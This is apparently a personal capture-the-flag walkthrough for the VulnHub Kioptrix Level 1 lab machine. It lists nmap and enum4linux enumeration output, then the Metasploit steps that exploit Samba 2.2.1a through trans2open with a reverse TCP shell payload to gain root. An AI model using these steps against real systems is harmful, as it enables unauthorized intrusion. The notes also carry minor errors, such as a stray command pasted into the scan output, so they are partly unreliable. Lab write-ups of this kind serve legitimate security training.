# [Machine](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

- # ENUM
	- ### nmap (`nmap -sV -p- -A -T4 kioptrix-1`)
		- ```PORT     STATE SERVICE     VERSION
			22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
			| ssh-hostkey: 
			|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
			|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
			|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
			|_sshv1: Server supports SSHv1
			80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
			|_http-title: Test Page for the Apache Web Server on Red Hat Linux
			| http-methods: 
			|_  Potentially risky methods: TRACE
			|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
			111/tcp  open  rpcbind     2 (RPC #100000)
			| rpcinfo: 
			|   program version    port/proto  service
			|   100000  2            111/tcp   rpcbind
			|   100000  2            111/udp   rpcbind
			|   100024  1           1024/tcp   status
			|_  100024  1           1024/udp   status
			139/tcp  open  netbios-ssn Samba smbd (workgroup: O<MYGROUP)
			443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
			| sslv2: 
			|   SSLv2 supported
			|   ciphers: 
			|     SSL2_DES_64_CBC_WITH_MD5
			|     SSL2_RC4_64_WITH_MD5
			|     SSL2_RC4_128_EXPORT40_WITH_MD5
			|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
			|     SSL2_DES_192_EDE3_CBC_WITH_MD5
			|     SSL2_RC4_128_WITH_MD5
			|_    SSL2_RC2_128_CBC_WITH_MD5
			|_ssl-date: 2025-08-16T21:32:59+00:00; +3h59m58s from scanner time.
			|_http-title: 400 Bad Request
			|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
			| ssl-cert: Subject: nmap -p445 --script smb-protocols  commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
			| Not valid before: 2009-09-26T09:32:06
			|_Not valid after:  2010-09-26T09:32:06
			1024/tcp open  status      1 (RPC #100024)
			
			Host script results:
			|_smb2-time: Protocol negotiation failed (SMB2)
			|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
			|_clock-skew: 3h59m57s
		- #### PORTS :
		  22      ssh
		  80      http    apache
		  111     rpc
		 139     samba
		 443     https   apache
		 1024    kdm
	- # enum4linux (`enum4linux -a kioptrix-1`)
		- Workgroup name: `MYGROUP`
		- NetBIOS name: `KIOPTRIX`

- # EXPLOITATION
	- Check for Samba version on msfconsole (Metasploit):
		- `search smb_version` -> `use 0` -> `set rhosts kioptrix-1` -> `exploit`
			- Samba version: `2.2.1a`
				- Search `samba 2.2.1a exploit` on google: "`trans2open`"
	- Set payload to `linux/x86/shell/reverse_tcp` (a old and vulnerable shell payload):
		- `set payload linux/x86/shell/reverse_tcp`
	- Run `exploit/linux/samba/trans2open` on `msfconsole`
		- We're root!
